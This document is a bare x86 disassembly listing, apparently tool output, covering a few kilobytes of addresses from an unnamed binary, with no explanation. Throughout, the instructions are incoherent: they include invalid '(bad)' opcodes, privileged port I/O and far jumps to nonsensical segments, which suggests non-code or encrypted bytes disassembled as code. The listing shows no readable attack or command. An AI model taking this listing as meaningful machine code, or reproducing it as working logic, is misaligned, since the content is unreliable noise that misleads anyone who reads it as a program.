  40e75a:	(bad)  
  40e75b:	push   0xfffffffa
  40e75d:	mov    dl,0xe7
  40e75f:	aaa    
  40e760:	dec    ebx
  40e761:	or     al,0xa2
  40e764:	clc    
  40e765:	add    ebp,DWORD PTR [edx]
  40e767:	inc    edx
  40e768:	push   edi
  40e769:	cmp    ebp,DWORD PTR [ecx+0x12443180]
  40e76f:	xchg   BYTE PTR [edx+0x5e],bl
  40e772:	sub    al,0x87
  40e774:	arpl   bx,di
  40e776:	adc    BYTE PTR [ecx-0x15],ch
  40e779:	xchg   DWORD PTR [esi-0x5c],edx
  40e77c:	or     al,0x47
  40e77e:	push   ebx
  40e77f:	leave  
  40e780:	sbb    esi,edi
  40e782:	xchg   edx,eax
  40e783:	mov    ds:0x8f15df8d,al
  40e788:	cmp    eax,0x3f37e39b
  40e78d:	sti    
  40e78e:	xlat   BYTE PTR ds:[ebx]
  40e78f:	and    BYTE PTR [ecx-0x6095c11e],0x36
  40e796:	bound  edi,QWORD PTR [edi+0x3e]
  40e799:	jmp    0xeeb7:0x56b6915e
  40e7a0:	jo     0x40e79a
  40e7a2:	adc    esp,edi
  40e7a4:	or     esp,ebp
  40e7a6:	enter  0x2845,0xb5
  40e7aa:	fstp   TBYTE PTR [ecx]
  40e7ac:	call   0x6ad7c1c1
  40e7b1:	add    ebx,DWORD PTR [esi]
  40e7b3:	adc    eax,0x4979c177
  40e7b8:	mov    esp,0x40244fba
  40e7bd:	xor    eax,0xd90b33c
  40e7c2:	fisub  WORD PTR [edi]
  40e7c4:	call   0x33e8:0xae133b6d
  40e7cb:	js     0x40e82c
  40e7cd:	jg     0x40e7eb
  40e7cf:	gs mov ah,0x11
  40e7d2:	loope  0x40e824
  40e7d4:	ss mov al,0xb4
  40e7d7:	in     al,dx
  40e7d8:	call   0x1598b981
  40e7dd:	add    DWORD PTR [eax+edx*2],ebx
  40e7e0:	pop    ebp
  40e7e1:	pushf  
  40e7e2:	aad    0x1a
  40e7e4:	mov    bl,0x39
  40e7e6:	mov    ebx,0x4a287d8a
  40e7eb:	pop    ecx
  40e7ec:	mov    bl,BYTE PTR [ebp-0x73]
  40e7ef:	scas   al,BYTE PTR es:[edi]
  40e7f0:	pop    ebx
  40e7f1:	test   eax,0x436d1629
  40e7f6:	adc    dh,bh
  40e7f8:	sbb    DWORD PTR es:[edi+0x1c77efcb],eax
  40e7ff:	int    0x29
  40e801:	loopne 0x40e793
  40e803:	add    al,0x0
  40e805:	jg     0x40e87f
  40e807:	int3   
  40e808:	inc    ebx
  40e809:	mov    ds:0x18d285a8,al
  40e80e:	repnz cld 
  40e810:	pop    ds
  40e811:	cdq    
  40e812:	mov    ch,0x16
  40e814:	mov    bl,0xd9
  40e816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e817:	mul    DWORD PTR [ebx]
  40e819:	bound  ebx,QWORD PTR [ebp-0x70]
  40e81c:	mov    dl,0x99
  40e81e:	cmp    DWORD PTR [edx-0x74],edx
  40e821:	push   esi
  40e822:	dec    ebx
  40e823:	pop    ecx
  40e824:	scas   eax,DWORD PTR es:[edi]
  40e825:	je     0x40e813
  40e827:	nop
  40e828:	pop    ss
  40e829:	inc    esi
  40e82a:	dec    ebp
  40e82b:	pop    edx
  40e82c:	sahf   
  40e82d:	popa   
  40e82e:	pop    esp
  40e82f:	test   eax,0xb47588fd
  40e834:	or     ah,BYTE PTR [eax+eiz*1+0xd16a8ef]
  40e83b:	inc    ecx
  40e83c:	and    BYTE PTR [eax],bh
  40e83e:	sbb    eax,0xa7240529
  40e843:	cmp    eax,0xc3e8afb5
  40e848:	pop    ss
  40e849:	adc    esp,esi
  40e84b:	lock jle 0x40e85e
  40e84e:	sti    
  40e84f:	and    bh,BYTE PTR [ecx+eiz*8+0x7fc70644]
  40e856:	shl    ebp,1
  40e858:	or     eax,0x3cf07d5f
  40e85d:	sub    al,0x1
  40e85f:	jnp    0x40e89c
  40e861:	xor    bl,BYTE PTR [ecx-0x36]
  40e864:	les    ebp,FWORD PTR [edx+esi*1+0x5dd84e27]
  40e86b:	xor    DWORD PTR [eax+edi*1],edi
  40e86e:	idiv   ch
  40e870:	dec    eax
  40e871:	mov    cl,0x7a
  40e873:	cli    
  40e874:	mov    al,BYTE PTR [eax-0x19]
  40e877:	jns    0x40e8ce
  40e879:	mul    DWORD PTR [ebx+0x66ba8f0d]
  40e87f:	shr    DWORD PTR gs:[eax+eiz*4],1
  40e883:	cmp    eax,0xf0cf6736
  40e888:	sbb    DWORD PTR ds:0xea7af5da,ebp
  40e88e:	and    al,0x98
  40e890:	add    al,0x65
  40e892:	fadd   DWORD PTR [ebp-0x5a29cd8d]
  40e898:	mov    ebx,0x767098ee
  40e89d:	les    ecx,FWORD PTR [ecx]
  40e89f:	retf   
  40e8a0:	iret   
  40e8a1:	inc    ebx
  40e8a2:	cmc    
  40e8a3:	stos   DWORD PTR es:[edi],eax
  40e8a4:	lods   eax,DWORD PTR ds:[esi]
  40e8a5:	lahf   
  40e8a6:	mov    ah,0xd4
  40e8a8:	rol    DWORD PTR ds:0x5da0fcc1,0x14
  40e8af:	inc    ecx
  40e8b0:	inc    esp
  40e8b1:	in     eax,0x3b
  40e8b3:	and    BYTE PTR [ecx-0xd7e8b0],bl
  40e8b9:	mov    esi,0x48ec7f57
  40e8be:	mov    esp,0xd7ea17ee
  40e8c3:	ds call 0xcafc07bd
  40e8c9:	prefetcht0 BYTE PTR [edi+0x3b]
  40e8cd:	inc    edx
  40e8ce:	sbb    eax,0x31f28805
  40e8d3:	and    bh,BYTE PTR [ebp+ebx*8-0x3]
  40e8d7:	clc    
  40e8d8:	int3   
  40e8d9:	mov    DWORD PTR [edx+0x5d],edx
  40e8dc:	daa    
  40e8dd:	stos   DWORD PTR es:[edi],eax
  40e8de:	mov    eax,esp
  40e8e0:	sbb    al,0xe7
  40e8e2:	xchg   esi,eax
  40e8e3:	(bad)  
  40e8e4:	ficomp WORD PTR [ecx-0x5d3b6a00]
  40e8ea:	xchg   ebx,eax
  40e8eb:	int    0x3d
  40e8ed:	xchg   ebx,eax
  40e8ee:	test   al,0xec
  40e8f0:	jnp    0x40e915
  40e8f2:	in     al,0x93
  40e8f4:	in     al,0xc
  40e8f6:	jl     0x40e8e5
  40e8f8:	push   eax
  40e8f9:	nop
  40e8fa:	jbe    0x40e8a3
  40e8fc:	fist   DWORD PTR [ecx]
  40e8fe:	mov    al,0xfe
  40e900:	pushf  
  40e901:	(bad)  
  40e902:	mov    fs,WORD PTR [eax]
  40e904:	dec    esp
  40e905:	ss dec esp
  40e907:	leave  
  40e908:	out    dx,al
  40e909:	sub    edi,esp
  40e90b:	call   FWORD PTR [ebp-0x6e]
  40e90e:	mov    dh,0x91
  40e910:	dec    eax
  40e911:	sbb    esp,DWORD PTR [edi+0x481ab392]
  40e917:	fist   WORD PTR [ebx-0x6f]
  40e91a:	popf   
  40e91b:	outs   dx,DWORD PTR ds:[esi]
  40e91c:	cmp    eax,0xf27b1c7
  40e921:	push   edx
  40e922:	je     0x40e8f8
  40e924:	or     eax,0xa4bac94e
  40e929:	cs test al,0x6a
  40e92c:	cmp    edx,DWORD PTR [eax-0x27690b65]
  40e932:	aas    
  40e933:	dec    ecx
  40e934:	ins    BYTE PTR es:[edi],dx
  40e935:	lds    esp,FWORD PTR [ecx+0x5d]
  40e938:	fild   WORD PTR [eax+0x5e488514]
  40e93e:	sahf   
  40e93f:	push   ecx
  40e940:	or     cl,BYTE PTR [ecx+0x4eccbc5c]
  40e946:	aam    0xf3
  40e948:	sub    ch,BYTE PTR [ebx]
  40e94a:	test   al,0xff
  40e94c:	inc    esi
  40e94d:	mov    esp,DWORD PTR [edx+esi*8]
  40e950:	mov    dl,0x1d
  40e952:	mov    BYTE PTR [edi+0x61],ch
  40e955:	(bad)  
  40e956:	(bad)  
  40e957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e958:	icebp  
  40e959:	xchg   esi,eax
  40e95a:	mov    ch,0xed
  40e95c:	pop    ds
  40e95d:	data16 add BYTE PTR [bp+di-0x588a],ah
  40e963:	sbb    eax,0xf7e14ba1
  40e968:	fsub   st,st(5)
  40e96b:	pop    es
  40e96c:	rol    BYTE PTR [esi+0x4aaf968f],0xe1
  40e973:	sub    ebp,esi
  40e975:	push   edx
  40e976:	mov    ecx,0xe540e4ca
  40e97b:	dec    eax
  40e97c:	(bad)  [ebp+esi*4+0x6b]
  40e980:	or     BYTE PTR [ecx-0x4f6eb731],cl
  40e986:	jno    0x40e9c2
  40e988:	std    
  40e989:	bound  edi,QWORD PTR [edi+0x6c]
  40e98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e98d:	repz pop esi
  40e98f:	inc    edi
  40e990:	push   ss
  40e991:	jmp    0x40ea05
  40e993:	jge    0x40e9a6
  40e995:	ds loopne 0x40e969
  40e998:	xchg   ecx,eax
  40e999:	pop    esp
  40e99a:	inc    ebx
  40e99b:	mov    esp,0xa4fc1244
  40e9a0:	fsubr  QWORD PTR [ecx]
  40e9a2:	pop    eax
  40e9a3:	pandn  mm5,QWORD PTR [edi+0x34eb20f7]
  40e9aa:	cmp    edx,DWORD PTR [ebx+0x39]
  40e9ad:	inc    ecx
  40e9ae:	mov    edx,0x15daa4c4
  40e9b3:	jne    0x40e94b
  40e9b5:	push   0x17138194
  40e9ba:	pop    eax
  40e9bb:	dec    ebp
  40e9bc:	aaa    
  40e9bd:	jmp    0x9f752f51
  40e9c2:	fadd   QWORD PTR [ebx+0x49]
  40e9c5:	imul   eax,DWORD PTR [ebx+0x10],0xa6b6bdd9
  40e9cc:	jne    0x40e9ec
  40e9ce:	add    ebx,DWORD PTR ds:0x88c9db72
  40e9d4:	push   0x75
  40e9d6:	push   0x458d3baf
  40e9db:	stos   BYTE PTR es:[edi],al
  40e9dc:	push   esp
  40e9dd:	loope  0x40ea0d
  40e9df:	mov    ebp,0x7cfee76d
  40e9e4:	dec    esp
  40e9e5:	mov    ch,0x81
  40e9e7:	push   cs
  40e9e8:	inc    esp
  40e9e9:	pushf  
  40e9ea:	adc    eax,0xeab46d10
  40e9ef:	outs   dx,BYTE PTR ds:[esi]
  40e9f0:	ins    DWORD PTR es:[edi],dx
  40e9f1:	icebp  
  40e9f2:	jbe    0x40ea35
  40e9f4:	pop    esi
  40e9f5:	xchg   esi,eax
  40e9f6:	dec    ebx
  40e9f7:	cmp    ebp,DWORD PTR [ebp+0x1168efa1]
  40e9fd:	jmp    0x281:0x5253a56c
  40ea04:	out    dx,eax
  40ea05:	xor    al,0x7c
  40ea07:	mov    ecx,0xae4fbbf8
  40ea0c:	loopne 0x40ea5d
  40ea0e:	xchg   esp,eax
  40ea0f:	jbe    0x40e9a9
  40ea11:	ror    DWORD PTR [edx-0x40e60a78],cl
  40ea17:	sti    
  40ea18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea19:	mov    di,0xfb07
  40ea1d:	mov    dh,BYTE PTR [esi-0x24]
  40ea20:	out    0x7f,al
  40ea22:	inc    esi
  40ea23:	cmp    al,BYTE PTR [ebx-0x24]
  40ea26:	jmp    0x40e9c6
  40ea28:	test   BYTE PTR [ecx-0x36ee7104],ch
  40ea2e:	out    dx,al
  40ea2f:	add    al,0x23
  40ea31:	fs xchg ebp,eax
  40ea33:	cdq    
  40ea34:	jp     0x40ea3a
  40ea36:	dec    esi
  40ea37:	adc    DWORD PTR [edi-0x6d11b167],ebp
  40ea3d:	(bad)  
  40ea3e:	ror    BYTE PTR [ebx-0x34],cl
  40ea41:	aaa    
  40ea42:	add    dl,ah
  40ea44:	pushf  
  40ea45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea46:	icebp  
  40ea47:	jne    0x40ea67
  40ea49:	push   DWORD PTR [ebp+0x25]
  40ea4c:	adc    al,0x51
  40ea4e:	or     BYTE PTR [ecx],0xb9
  40ea51:	shr    BYTE PTR ds:[ecx],0xf9
  40ea55:	hlt    
  40ea56:	stc    
  40ea57:	push   ecx
  40ea58:	call   0x27a269b6
  40ea5d:	ss pop esp
  40ea5f:	jmp    0x7883d0a2
  40ea64:	cli    
  40ea65:	ja     0x40ea17
  40ea67:	sbb    eax,0xab95cee
  40ea6c:	xor    al,0xb8
  40ea6e:	cmp    BYTE PTR [edx],bl
  40ea70:	outs   dx,BYTE PTR ds:[esi]
  40ea71:	cmp    eax,0xd120819e
  40ea76:	or     BYTE PTR [edi-0xb],dl
  40ea79:	jge    0x40eadb
  40ea7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7c:	pop    ds
  40ea7d:	popa   
  40ea7e:	cli    
  40ea7f:	outs   dx,BYTE PTR ds:[esi]
  40ea80:	jmp    0x7022:0xbfba2b78
  40ea87:	out    0xc5,eax
  40ea89:	into   
  40ea8a:	dec    ecx
  40ea8b:	adc    BYTE PTR [ebx],al
  40ea8d:	add    BYTE PTR [ebp+0x33],al
  40ea90:	scas   al,BYTE PTR es:[edi]
  40ea91:	sahf   
  40ea92:	push   ds
  40ea93:	cmc    
  40ea94:	jp     0x40ea50
  40ea96:	(bad)  
  40ea97:	int3   
  40ea98:	in     eax,dx
  40ea99:	es cdq 
  40ea9b:	imul   ebp,ecx,0xd091c508
  40eaa1:	mov    DWORD PTR [bp+0x579b],ebp
  40eaa6:	mov    BYTE PTR [edi+0x31],dl
  40eaa9:	cld    
  40eaaa:	mov    ch,0xbb
  40eaac:	mov    al,ds:0x7e05660e
  40eab1:	add    ah,BYTE PTR [edi]
  40eab3:	inc    esi
  40eab4:	scas   al,BYTE PTR es:[edi]
  40eab5:	idiv   BYTE PTR [edx-0x5e]
  40eab8:	mov    ecx,0x173f3e03
  40eabd:	xchg   esp,eax
  40eabe:	jae    0x40ead9
  40eac0:	cmp    eax,0x705ee62
  40eac5:	push   0xc7e83568
  40eaca:	nop
  40eacb:	push   edi
  40eacc:	or     edi,DWORD PTR [esi+0x578b7ac3]
  40ead2:	enter  0xe6d,0xbb
  40ead6:	mov    ch,0x17
  40ead8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead9:	inc    edi
  40eada:	jl     0x40eb4c
  40eadc:	sar    DWORD PTR ds:0x299ce181,1
  40eae2:	imul   DWORD PTR [edi]
  40eae4:	retf   
  40eae5:	mov    ah,0x7d
  40eae7:	dec    edi
  40eae8:	(bad)  
  40eae9:	mov    esp,0xca52de66
  40eaee:	mov    ebp,0x43390d4d
  40eaf3:	test   DWORD PTR [ebx],ecx
  40eaf5:	mov    ebx,0xeca422b0
  40eafa:	icebp  
  40eafb:	dec    edx
  40eafc:	or     al,0x8
  40eafe:	ret    
  40eaff:	sbb    DWORD PTR [ebp-0x728f6a9a],ecx
  40eb05:	mov    ch,BYTE PTR [ebp-0x3e]
  40eb08:	inc    edi
  40eb09:	xchg   edx,eax
  40eb0a:	sbb    ecx,DWORD PTR [ecx]
  40eb0c:	ja     0x40eaf5
  40eb0e:	mov    cl,0xff
  40eb10:	lods   eax,DWORD PTR ds:[esi]
  40eb11:	dec    esp
  40eb12:	pop    edi
  40eb13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb14:	pop    DWORD PTR [eax]
  40eb16:	stos   DWORD PTR es:[edi],eax
  40eb17:	int3   
  40eb18:	addr16 loop 0x40eb7e
  40eb1b:	clc    
  40eb1c:	mov    dl,0x32
  40eb1e:	mov    edx,0xce0dd217
  40eb23:	imul   ebp,DWORD PTR [edi],0x3
  40eb26:	inc    esp
  40eb27:	xor    al,0x5
  40eb29:	jge    0x40eba7
  40eb2b:	(bad)  
  40eb2c:	cmp    eax,DWORD PTR [edi+0x67ba4388]
  40eb32:	sub    eax,0xcc68773
  40eb37:	xchg   ebp,eax
  40eb38:	mov    eax,ds:0x924df28
  40eb3d:	int3   
  40eb3e:	dec    esi
  40eb3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb40:	add    eax,edi
  40eb42:	lahf   
  40eb43:	inc    edx
  40eb44:	cwde   
  40eb45:	add    BYTE PTR [ebx],al
  40eb47:	pop    edi
  40eb48:	jmp    0x3f38190
  40eb4d:	ret    
  40eb4e:	aam    0xa0
  40eb50:	arpl   WORD PTR [edi+esi*2-0x21e19b1a],di
  40eb57:	mov    bl,0xaa
  40eb59:	mov    dh,0x24
  40eb5b:	sbb    esi,DWORD PTR [edi+0x3e]
  40eb5e:	scas   al,BYTE PTR es:[edi]
  40eb5f:	fisttp DWORD PTR [edx]
  40eb61:	pop    ebx
  40eb62:	not    DWORD PTR [edx]
  40eb64:	leave  
  40eb65:	mov    ds:0xf0e63f7,al
  40eb6a:	gs (bad) 
  40eb6d:	xor    al,0x76
  40eb6f:	xor    esi,edx
  40eb71:	imul   edi,DWORD PTR [eax+ebp*1+0x17],0x8afd02f2
  40eb79:	call   0x95876a91
  40eb7e:	dec    esi
  40eb7f:	shr    BYTE PTR ds:0x89a7d399,0x35
  40eb86:	dec    ebp
  40eb87:	ret    
  40eb88:	mov    ebx,0xa3da005a
  40eb8d:	jb     0x40eb43
  40eb8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb90:	xchg   ebp,eax
  40eb91:	jecxz  0x40eb83
  40eb93:	jmp    0x61a5:0x8a01250d
  40eb9a:	and    bl,0xb7
  40eb9d:	xor    DWORD PTR [ecx+0xfce1d41],esp
  40eba3:	xchg   edx,eax
  40eba4:	and    BYTE PTR [edx],0xfc
  40eba7:	ret    0x7656
  40ebaa:	adc    eax,0x576061b5
  40ebaf:	test   eax,0xc38477a7
  40ebb4:	stos   BYTE PTR es:[edi],al
  40ebb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebb6:	lgs    esp,FWORD PTR [eax+0x70]
  40ebba:	inc    edx
  40ebbb:	lea    ebp,[ebx+0x66e7b77e]
  40ebc1:	mov    ds:0x4211d70,eax
  40ebc6:	and    ecx,DWORD PTR [edx+0x57]
  40ebc9:	pop    ebx
  40ebca:	ficom  DWORD PTR [edi-0x73]
  40ebcd:	add    dl,bh
  40ebcf:	xchg   edx,eax
  40ebd0:	dec    ecx
  40ebd1:	stc    
  40ebd2:	ins    BYTE PTR es:[edi],dx
  40ebd3:	arpl   si,bp
  40ebd5:	shl    DWORD PTR [ebx],0x3a
  40ebd8:	fucomip st,st(7)
  40ebda:	call   0x605c:0x22c76557
  40ebe1:	fnstenv [ecx]
  40ebe3:	vpsrlq xmm2,xmm3,XMMWORD PTR [edx]
  40ebe7:	ret    0x47da
  40ebea:	cmp    eax,0x101df8ca
  40ebef:	call   FWORD PTR [edx-0x63]
  40ebf2:	pop    esi
  40ebf3:	mov    DWORD PTR ds:0x32d0d3de,esp
  40ebf9:	cmp    ch,BYTE PTR [edi-0x73]
  40ebfc:	sahf   
  40ebfd:	cmp    bh,BYTE PTR [edi]
  40ebff:	int    0x9
  40ec01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec02:	test   dh,ch
  40ec04:	pop    ebp
  40ec05:	push   edi
  40ec06:	mov    dh,0xfc
  40ec08:	repz in eax,dx
  40ec0a:	fist   WORD PTR [ecx-0x50]
  40ec0d:	inc    edx
  40ec0e:	fcomp  QWORD PTR [ebx+0x2eec1ea5]
  40ec14:	fsub   st,st(7)
  40ec16:	daa    
  40ec17:	aaa    
  40ec18:	test   eax,0xf39aa16c
  40ec1d:	and    eax,0x8769729f
  40ec22:	jmp    0xcd27:0x1ffe2667
  40ec29:	mov    dl,0x2d
  40ec2b:	fsubr  st,st(4)
  40ec2d:	jnp    0x40ec7b
  40ec2f:	mov    esp,0x7cb5319d
  40ec34:	mov    bh,0x1f
  40ec36:	iret   
  40ec37:	xlat   BYTE PTR ds:[ebx]
  40ec38:	push   ebx
  40ec39:	nop
  40ec3a:	lea    ebx,[edx*4-0x2ace37c]
  40ec41:	mov    esi,0x449cc705
  40ec46:	repz dec edx
  40ec48:	out    dx,al
  40ec49:	xchg   edx,eax
  40ec4a:	jbe    0x40ec0b
  40ec4c:	jo     0x40ebef
  40ec4e:	fiadd  DWORD PTR [edi-0x7a377a19]
  40ec54:	sbb    al,0x26
  40ec56:	test   DWORD PTR [eax+0x4],edx
  40ec59:	xor    ebx,DWORD PTR [esi]
  40ec5b:	push   ebp
  40ec5c:	jecxz  0x40ec60
  40ec5e:	dec    ebx
  40ec5f:	cmp    bl,BYTE PTR [ebx-0xf4bf32e]
  40ec65:	mov    ds:0x48152feb,eax
  40ec6a:	inc    ebp
  40ec6b:	lods   eax,DWORD PTR ds:[esi]
  40ec6c:	retf   
  40ec6d:	sub    bh,BYTE PTR [edi-0x70]
  40ec70:	out    dx,al
  40ec71:	or     BYTE PTR [eax+0x44b21784],ah
  40ec77:	xchg   esi,eax
  40ec78:	cmp    edx,ebp
  40ec7a:	mov    eax,ds:0xf8341579
  40ec7f:	imul   DWORD PTR [esi]
  40ec81:	jne    0x40ecd1
  40ec83:	sbb    BYTE PTR [ebx-0x5d],bl
  40ec86:	cmp    al,0x57
  40ec88:	cmp    DWORD PTR [eax+0x772c0491],edi
  40ec8e:	push   ss
  40ec8f:	sub    bh,BYTE PTR [ebp-0xb]
  40ec92:	inc    esp
  40ec93:	xor    ecx,DWORD PTR [ebx+0x62f017d6]
  40ec99:	inc    esp
  40ec9a:	mov    ebp,0xf71e9e4
  40ec9f:	retf   
  40eca0:	scas   eax,DWORD PTR es:[edi]
  40eca1:	popa   
  40eca2:	inc    ebp
  40eca3:	xchg   edi,eax
  40eca4:	jb     0x40ec5e
  40eca6:	mov    ebx,0xfe6d0cca
  40ecab:	out    dx,eax
  40ecac:	mov    edx,0xb8ba1020
  40ecb1:	scas   al,BYTE PTR es:[edi]
  40ecb2:	and    DWORD PTR [edi],edi
  40ecb4:	fmul   QWORD PTR [edx+esi*4-0x79]
  40ecb8:	call   0x46e0d84f
  40ecbd:	enter  0x6e48,0x7f
  40ecc1:	outs   dx,DWORD PTR ds:[esi]
  40ecc2:	and    ax,0x41c9
  40ecc6:	push   esi
  40ecc7:	call   0x778e7f86
  40eccc:	push   ecx
  40eccd:	(bad)  
  40ecce:	and    esp,DWORD PTR [eax]
  40ecd0:	jo     0x40ed44
  40ecd2:	jb     0x40ed48
  40ecd4:	push   ss
  40ecd5:	mov    ecx,0x60eeb7fd
  40ecda:	fwait
  40ecdb:	jp     0x40ecfe
  40ecdd:	pop    ss
  40ecde:	(bad)  
  40ecdf:	scas   eax,DWORD PTR es:[edi]
  40ece0:	xchg   ebx,ebx
  40ece2:	idiv   bh
  40ece4:	(bad)  
  40ece6:	test   BYTE PTR [edi],cl
  40ece8:	xor    bl,al
  40ecea:	pop    edi
  40eceb:	jle    0x40ed5f
  40eced:	mov    BYTE PTR [edi-0x18],bh
  40ecf0:	das    
  40ecf1:	sbb    edx,DWORD PTR [ebx]
  40ecf3:	leave  
  40ecf4:	sbb    cl,BYTE PTR ds:0xa76eb0fd
  40ecfa:	test   eax,0xcd5e8f89
  40ecff:	sbb    cl,ch
  40ed01:	mov    dl,0x9f
  40ed03:	sub    BYTE PTR [edi],ah
  40ed05:	pop    ecx
  40ed06:	test   DWORD PTR [ebx],esi
  40ed08:	or     edx,esi
  40ed0a:	and    ebx,DWORD PTR [edx]
  40ed0c:	int3   
  40ed0d:	inc    edx
  40ed0e:	retf   
  40ed0f:	stc    
  40ed10:	popf   
  40ed11:	xor    al,0x79
  40ed13:	xchg   esi,eax
  40ed14:	inc    eax
  40ed15:	cmp    ch,cl
  40ed17:	or     DWORD PTR [edi+0x5e],0xb68e59c8
  40ed1e:	(bad)  
  40ed20:	outs   dx,DWORD PTR ds:[esi]
  40ed21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed22:	(bad)  
  40ed23:	stos   BYTE PTR es:[edi],al
  40ed24:	inc    esp
  40ed25:	ret    
  40ed26:	repnz ins BYTE PTR es:[edi],dx
  40ed28:	adc    DWORD PTR [edx+ebx*8-0x54],edx
  40ed2c:	cmp    dh,BYTE PTR [ecx+0x49e70ea0]
  40ed32:	add    eax,0x92556b2e
  40ed37:	repz and BYTE PTR [edi],ch
  40ed3a:	nop
  40ed3b:	data16 jge 0x40ed5e
  40ed3e:	xchg   edx,eax
  40ed3f:	test   eax,0xc58d4f45
  40ed44:	or     BYTE PTR [ecx+eiz*4],al
  40ed47:	cdq    
  40ed48:	mov    fs,WORD PTR [esi-0x4c]
  40ed4b:	loope  0x40ed9c
  40ed4d:	mov    WORD PTR [ecx-0x32d416f3],?
  40ed53:	or     ebp,DWORD PTR es:[eax]
  40ed56:	jo     0x40ed19
  40ed58:	dec    eax
  40ed59:	mov    bh,0x43
  40ed5b:	xor    BYTE PTR [ebx],bl
  40ed5d:	pop    esi
  40ed5e:	mov    ecx,0x8e3be104
  40ed63:	sbb    ah,BYTE PTR [esi]
  40ed65:	enter  0x1f7d,0x8b
  40ed69:	push   eax
  40ed6a:	pop    esp
  40ed6b:	stos   BYTE PTR es:[edi],al
  40ed6c:	cmp    eax,0x46f8bb51
  40ed71:	int3   
  40ed72:	mov    al,ds:0xb5614902
  40ed77:	adc    bh,BYTE PTR [ebx-0x1af40287]
  40ed7d:	ins    BYTE PTR es:[edi],dx
  40ed7e:	int    0x80
  40ed80:	or     al,0x2a
  40ed82:	repz jmp 0x40edac
  40ed85:	mov    al,ds:0x88d1f787
  40ed8a:	pushf  
  40ed8b:	add    bh,BYTE PTR [esi-0x6d5fa281]
  40ed91:	out    0x52,al
  40ed93:	jb     0x40ed87
  40ed95:	imul   edi,DWORD PTR [ecx-0x64ae2813],0xfffffff6
  40ed9c:	outs   dx,BYTE PTR ds:[esi]
  40ed9d:	push   0xffffffc3
  40ed9f:	push   0xffffffb6
  40eda1:	mov    al,0x66
  40eda3:	mov    ss,WORD PTR [ebx-0xc]
  40eda6:	mov    eax,ss:0x9998e5ea
  40edac:	loope  0x40eda3
  40edae:	std    
  40edaf:	pop    ecx
  40edb0:	cmp    DWORD PTR [esi-0x43],edx
  40edb3:	sub    esp,eax
  40edb5:	mov    eax,0xb5b8527c
  40edba:	dec    ecx
  40edbb:	not    BYTE PTR [esi]
  40edbd:	dec    eax
  40edbe:	dec    edi
  40edbf:	rcr    DWORD PTR [eax+ebp*2],cl
  40edc2:	jno    0x40ee15
  40edc4:	mov    DWORD PTR [esi-0x5],edi
  40edc7:	inc    ebp
  40edc8:	fsubr  st,st(4)
  40edca:	stos   BYTE PTR es:[edi],al
  40edcb:	fs ret 
  40edcd:	jne    0x40eded
  40edcf:	sar    edi,1
  40edd1:	sub    al,ch
  40edd3:	cmc    
  40edd4:	jns    0x40edb2
  40edd6:	push   cs
  40edd7:	mov    es,WORD PTR [ecx-0x261cd8d2]
  40eddd:	or     esp,DWORD PTR fs:[edi+0x22]
  40ede1:	jmp    0x72bfa5f9
  40ede6:	cmp    eax,0xea857f24
  40edeb:	out    0xf0,eax
  40eded:	push   ebx
  40edee:	pop    es
  40edef:	cld    
  40edf0:	dec    esp
  40edf1:	mov    ?,WORD PTR [edx+edx*4-0x24]
  40edf5:	push   ebp
  40edf6:	lods   eax,DWORD PTR ds:[esi]
  40edf7:	test   BYTE PTR [edi],cl
  40edf9:	jae    0x40edd1
  40edfb:	in     eax,dx
  40edfc:	adc    ah,cl
  40edfe:	push   0x4fff8dbe
  40ee03:	add    ebp,DWORD PTR [esp+ebx*1+0x35]
  40ee07:	ds pop ebx
  40ee09:	pop    es
  40ee0a:	ds cmp eax,0xe8e1bc23
  40ee10:	test   eax,0x27caf1e7
  40ee15:	pop    esp
  40ee16:	add    DWORD PTR [ebp-0x7eb92702],0xffffffd0
  40ee1d:	cs stos DWORD PTR es:[edi],eax
  40ee1f:	mov    ch,0x2e
  40ee21:	cs jnp 0x40ee30
  40ee24:	out    0xe2,al
  40ee26:	jae    0x40ee0e
  40ee28:	dec    esi
  40ee29:	stos   BYTE PTR es:[edi],al
  40ee2a:	inc    edx
  40ee2b:	popa   
  40ee2c:	push   cs
  40ee2d:	mov    BYTE PTR [edx],dh
  40ee2f:	call   0x9ae3b3b5
  40ee34:	push   es
  40ee35:	jnp    0x40ede7
  40ee37:	out    dx,eax
  40ee38:	xor    edi,ecx
  40ee3a:	dec    ebx
  40ee3b:	cmc    
  40ee3c:	rcl    BYTE PTR [edi],cl
  40ee3e:	pop    ecx
  40ee3f:	lods   eax,DWORD PTR ds:[esi]
  40ee40:	(bad)  
  40ee42:	loope  0x40ee34
  40ee44:	(bad)  
  40ee45:	and    eax,0xbf0d1470
  40ee4a:	(bad)  [ebx]
  40ee4c:	push   0x99729e4b
  40ee51:	in     al,dx
  40ee52:	jmp    0x40eea2
  40ee54:	retf   0xea3c
  40ee57:	in     al,0x95
  40ee59:	mov    ah,0xd6
  40ee5b:	popf   
  40ee5c:	in     al,dx
  40ee5d:	inc    eax
  40ee5e:	test   al,0xf0
  40ee60:	ins    BYTE PTR es:[edi],dx
  40ee61:	push   edx
  40ee62:	fucom  st(7)
  40ee64:	and    DWORD PTR [eiz*2+0x47b8d7f4],esp
  40ee6b:	mov    esi,0x10cf5016
  40ee70:	adc    eax,0xd204a7b5
  40ee75:	fs sub eax,0x36d0fb8b
  40ee7b:	fs in  al,0x46
  40ee7e:	jo     0x40eea8
  40ee80:	in     eax,0x37
  40ee82:	xchg   ecx,eax
  40ee83:	pop    edi
  40ee84:	cmp    DWORD PTR [esi+eax*8+0x1b1dff4],0xf77558e
  40ee8f:	in     eax,0xe4
  40ee91:	xchg   BYTE PTR [esi+0x39],cl
  40ee94:	mov    ebx,0xff08bf81
  40ee99:	addr16 lahf 
  40ee9b:	in     eax,dx
  40ee9c:	in     al,dx
  40ee9d:	adc    bh,ch
